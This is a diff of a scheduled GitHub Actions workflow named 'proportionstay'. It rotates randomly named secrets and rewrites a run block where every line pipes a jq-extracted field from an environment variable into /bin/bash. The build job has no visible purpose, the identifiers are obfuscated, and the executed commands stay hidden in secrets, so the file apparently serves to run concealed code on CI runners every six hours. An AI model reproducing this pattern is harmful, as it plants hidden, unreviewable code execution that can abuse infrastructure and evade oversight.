@@ -2,28 +2,25 @@ name: proportionstay
 on:
   workflow_dispatch:
   schedule:
-    - cron: '40 2/6 * * *'
+    - cron: '37 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: proportionstay
         env:
-          u43016: ${{ secrets.u43016 }}
+          t267: ${{ secrets.t267 }}
         run: |
-          echo $u43016 | jq -r .lwmst53800 | /bin/bash
-          echo $lh8794 | jq -r .pz83096 | /bin/bash
-          echo $u30845 | jq -r .emcs2403 | /bin/bash
-          echo $zrx6 | jq -r .xdzjw3874 | /bin/bash
-          echo $ok6534 | jq -r .nst0947 | /bin/bash
-          echo $fw93 | jq -r .sdnkr8 | /bin/bash
-          echo $m7 | jq -r .u6 | /bin/bash
-          echo $yx97 | jq -r .vaidd33134 | /bin/bash
-          echo $gbr33393 | jq -r .st5337 | /bin/bash
-          echo $bednh58 | jq -r .aldt1288 | /bin/bash
-          echo $cmboq9 | jq -r .pfe68 | /bin/bash
-          echo $ykf7643 | jq -r .hqiga3 | /bin/bash
-          echo $asbfu0079 | jq -r .dyls36057 | /bin/bash
-          echo $vg3 | jq -r .vid60 | /bin/bash
+          echo $t267 | jq -r .lj861 | /bin/bash
+          echo $yu426 | jq -r .wz63609 | /bin/bash
+          echo $l92466 | jq -r .kijqa0252 | /bin/bash
+          echo $cw70833 | jq -r .idi006 | /bin/bash
+          echo $qldv75215 | jq -r .kf199 | /bin/bash
+          echo $v30 | jq -r .qc049 | /bin/bash
+          echo $qki75 | jq -r .qz42 | /bin/bash
+          echo $kao6101 | jq -r .dgkr0654 | /bin/bash
+          echo $walgl42 | jq -r .fb0324 | /bin/bash
 
